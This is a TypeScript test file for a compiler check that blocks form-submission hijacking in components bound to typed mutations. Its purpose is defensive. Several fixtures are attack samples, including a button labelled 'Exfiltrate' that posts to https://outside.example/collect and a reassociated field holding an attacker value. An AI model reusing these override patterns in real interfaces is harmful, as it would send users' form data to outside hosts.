import { describe, expect, it } from 'vitest';

import { compileComponentModule } from './index.js';

interface ExtraFile {
  readonly fileName: string;
  readonly source: string;
}

function compile(source: string, extraFiles: readonly ExtraFile[] = []) {
  return compileComponentModule({
    extraFiles,
    fileName: 'src/browser-final-review.tsx',
    source,
  } as Parameters<typeof compileComponentModule>[0] & {
    extraFiles: readonly ExtraFile[];
  });
}

function kv242(source: string, extraFiles: readonly ExtraFile[] = []) {
  return compile(source, extraFiles).diagnostics.filter(
    (diagnostic) => diagnostic.code === 'KV242',
  );
}

const mutationDeclaration = `
export const save = mutation('account/save', {
  input: s.object({ email: s.string().optional() }),
  handler() { return null; },
});
`;

describe('final browser mutation-form adversarial review', () => {
  it.each([
    ['FORMAction', ''],
    ['formMethod', ''],
    ['FORMENCTYPE', 'text/plain'],
    ['formTarget', '_blank'],
    ['FORMNOVALIDATE', null],
  ])('rejects direct %s transport overrides, including empty values', (name, value) => {
    const attribute = value === null ? name : `${name}=${JSON.stringify(value)}`;
    expect(
      kv242(`
${mutationDeclaration}
export const View = component({
  render: () => <form mutation={save}><button ${attribute}>Save</button></form>,
});
`),
    ).not.toEqual([]);
  });

  it('follows local, underscored, aliased imported, and nested components', () => {
    const diagnostics = kv242(
      `
import { ImportedUnsafe as RenamedUnsafe } from './submitters';
${mutationDeclaration}
const _LocalUnsafe = () => <button formtarget="_blank">Local</button>;
function Nested() { return <RenamedUnsafe />; }
export const View = component({
  render: () => <form mutation={save}><_LocalUnsafe /><Nested /></form>,
});
`,
      [
        {
          fileName: 'src/submitters.tsx',
          source: `export function ImportedUnsafe() {
  return <input type="submit" formenctype="text/plain" />;
}`,
        },
      ],
    );
    const messages = diagnostics.map((diagnostic) => diagnostic.message);
    expect(messages).toEqual(
      expect.arrayContaining([
        expect.stringContaining('component-rendered formtarget'),
        expect.stringContaining('component-rendered formenctype'),
      ]),
    );
  });

  it.each([
    [
      'recursive component',
      `function Recursive() { return <Recursive />; }
export const View = component({ render: () => <form mutation={save}><Recursive /></form> });`,
      [],
    ],
    [
      'opaque component',
      `function Opaque({ child }) { return child; }
export const View = component({ render: (_q, state) => <form mutation={save}><Opaque child={state.child} /></form> });`,
      [],
    ],
    [
      'namespace component',
      `import * as UI from './submitters';
export const View = component({ render: () => <form mutation={save}><UI.Unsafe /></form> });`,
      [{ fileName: 'src/submitters.tsx', source: 'export const Unsafe = () => <button />;' }],
    ],
    [
      'barrel re-export component',
      `import { Unsafe } from './barrel';
export const View = component({ render: () => <form mutation={save}><Unsafe /></form> });`,
      [
        { fileName: 'src/barrel.ts', source: "export { Unsafe } from './submitters';" },
        { fileName: 'src/submitters.tsx', source: 'export const Unsafe = () => <button />;' },
      ],
    ],
    [
      'ambiguous extensionless component import',
      `import { Ambiguous } from './ambiguous';
export const View = component({ render: () => <form mutation={save}><Ambiguous /></form> });`,
      [
        { fileName: 'src/ambiguous.ts', source: 'export function Ambiguous() { return null; }' },
        {
          fileName: 'src/ambiguous.tsx',
          source: 'export function Ambiguous() { return <button formtarget="_blank" />; }',
        },
      ],
    ],
  ])('fails closed for a %s', (_label, view, extraFiles) => {
    expect(
      kv242(`${mutationDeclaration}\n${view}`, extraFiles as readonly ExtraFile[]),
    ).not.toEqual([]);
  });

  it('allows one statically separate native form but rejects duplicate native ids', () => {
    const safe = kv242(`
${mutationDeclaration}
export const View = component({ render: () => <>
  <form mutation={save}><button>Save</button></form>
  <form id="preview" action="/preview" method="get" />
  <button form="preview" formaction="/preview/compact" formmethod="get">Preview</button>
</> });
`);
    expect(safe).toEqual([]);

    const duplicate = kv242(`
${mutationDeclaration}
export const View = component({ render: () => <>
  <form mutation={save}><button>Save</button></form>
  <form id="preview" action="/preview-a" method="get" />
  <form id="preview" action="/preview-b" method="get" />
  <button form="preview" formaction="/preview/compact" formmethod="get">Preview</button>
</> });
`);
    expect(duplicate).not.toEqual([]);
  });

  it('keeps a uniquely identified imported native form disjoint', () => {
    expect(
      kv242(
        `
import NativePreview from './native-preview';
${mutationDeclaration}
export const View = component({ render: () => <>
  <form mutation={save}><button>Save</button></form>
  <NativePreview />
  <button form="preview" formaction="/preview/compact" formmethod="get">Preview</button>
</> });
`,
        [
          {
            fileName: 'src/native-preview.tsx',
            source:
              'export default function NativePreview() { return <form id="preview" action="/preview" method="get" />; }',
          },
        ],
      ),
    ).toEqual([]);
  });

  it('keeps an imported external control assigned to one local native form disjoint', () => {
    expect(
      kv242(
        `
import { NativePreviewButton } from './native-preview-button';
${mutationDeclaration}
export const View = component({ render: () => <>
  <form mutation={save}><button>Save</button></form>
  <form id="preview" action="/preview" method="get" />
  <NativePreviewButton />
</> });
`,
        [
          {
            fileName: 'src/native-preview-button.tsx',
            source: `export const NativePreviewButton = () => (
  <button form="preview" formaction="/preview/compact" formmethod="get">Preview</button>
);`,
          },
        ],
      ),
    ).toEqual([]);
  });

  it('includes default-imported successful controls in required-field analysis', () => {
    expect(
      kv242(
        `
import EmailField from './email-field';
export const save = mutation('account/save', {
  input: s.object({ email: s.string() }),
  handler() { return null; },
});
export const View = component({
  render: () => <form mutation={save}><EmailField /></form>,
});
`,
        [
          {
            fileName: 'src/email-field.tsx',
            source:
              'export default function EmailField() { return <input name="email" type="email" />; }',
          },
        ],
      ),
    ).toEqual([]);
  });

  it('distinguishes repeated component instances from a component cycle', () => {
    expect(
      kv242(`
${mutationDeclaration}
function SafeSubmitter() { return <button type="submit">Save</button>; }
export const View = component({
  render: () => <form mutation={save}><SafeSubmitter /><SafeSubmitter /></form>,
});
`),
    ).toEqual([]);
  });

  it('counts repeated component-rendered fields as repeated successful controls', () => {
    expect(
      kv242(`
export const save = mutation('account/save', {
  input: s.object({ email: s.string() }),
  handler() { return null; },
});
function EmailField() { return <input name="email" type="email" />; }
export const View = component({
  render: () => <form mutation={save}><EmailField /><EmailField /></form>,
});
`),
    ).not.toEqual([]);
  });

  it('rejects an imported sibling submitter associated to a typed form', () => {
    const diagnostics = kv242(
      `
import { ExternalOverride } from './external-override';
${mutationDeclaration}
export const View = component({ render: () => <>
  <form id="account-save" mutation={save}><button>Save</button></form>
  <ExternalOverride />
</> });
`,
      [
        {
          fileName: 'src/external-override.tsx',
          source: `export const ExternalOverride = () => (
  <button form="account-save" formaction="https://outside.example/collect" formmethod="post">
    Exfiltrate
  </button>
);`,
        },
      ],
    );
    expect(diagnostics).not.toEqual([]);
  });

  it('rejects an external submitter associated to an imported typed form', () => {
    const diagnostics = kv242(
      `
import { ImportedTypedForm } from './typed-form';
export const View = component({ render: () => <>
  <ImportedTypedForm />
  <button form="account-save" formaction="https://outside.example/collect" formmethod="post">
    Exfiltrate
  </button>
</> });
`,
      [
        {
          fileName: 'src/typed-form.tsx',
          source: `${mutationDeclaration}
export const ImportedTypedForm = component({
  render: () => <form id="account-save" mutation={save}><button>Save</button></form>,
});`,
        },
      ],
    );
    expect(diagnostics).not.toEqual([]);
  });

  it('rejects component-rendered controls that change their form owner', () => {
    const diagnostics = kv242(
      `
import { ReassociatedField } from './reassociated-field';
${mutationDeclaration}
export const View = component({ render: () => <>
  <form id="other" action="/preview" method="get" />
  <form mutation={save}><ReassociatedField /></form>
</> });
`,
      [
        {
          fileName: 'src/reassociated-field.tsx',
          source:
            'export const ReassociatedField = () => <input form="other" name="email" value="attacker@example.test" />;',
        },
      ],
    );
    expect(diagnostics).not.toEqual([]);
  });

  it.each([
    ['an explicit association without a transport override', 'form="account-save"'],
    ['a known form association spread', '{...{ form: "account-save" }}'],
    ['an opaque caller-owned spread', '{...props}'],
  ])('rejects an imported sibling control carrying %s', (_label, attributes) => {
    expect(
      kv242(
        `
import { ExternalControl } from './external-control';
${mutationDeclaration}
export const View = component({ render: () => <>
  <form id="account-save" mutation={save}><button>Save</button></form>
  <ExternalControl />
</> });
`,
        [
          {
            fileName: 'src/external-control.tsx',
            source: `export const ExternalControl = (props) => <input ${attributes} name="email" />;`,
          },
        ],
      ),
    ).not.toEqual([]);
  });

  it('preserves closed form-free spreads', () => {
    expect(
      kv242(
        `
import { SafeField } from './safe-field';
${mutationDeclaration}
export const View = component({ render: () =>
  <form id="account-save" mutation={save}>
    <SafeField />
  </form>
});
`,
        [
          {
            fileName: 'src/safe-field.tsx',
            source: `export const SafeField = () => <button {...{ class: 'field' }}>Safe</button>;`,
          },
        ],
      ),
    ).toEqual([]);
  });

  it('rejects an opaque spread on a direct typed-form control', () => {
    expect(
      kv242(`
${mutationDeclaration}
const props = getRuntimeProps();
export const View = component({ render: () =>
  <form mutation={save}><button {...props}>Save</button></form>
});
`),
    ).not.toEqual([]);
  });

  it('fails closed for a cyclic sibling next to a typed form', () => {
    expect(
      kv242(`
${mutationDeclaration}
function RecursiveSibling() { return <RecursiveSibling />; }
export const View = component({ render: () => <>
  <form id="account-save" mutation={save}><button>Save</button></form>
  <RecursiveSibling />
</> });
`),
    ).not.toEqual([]);
  });
});
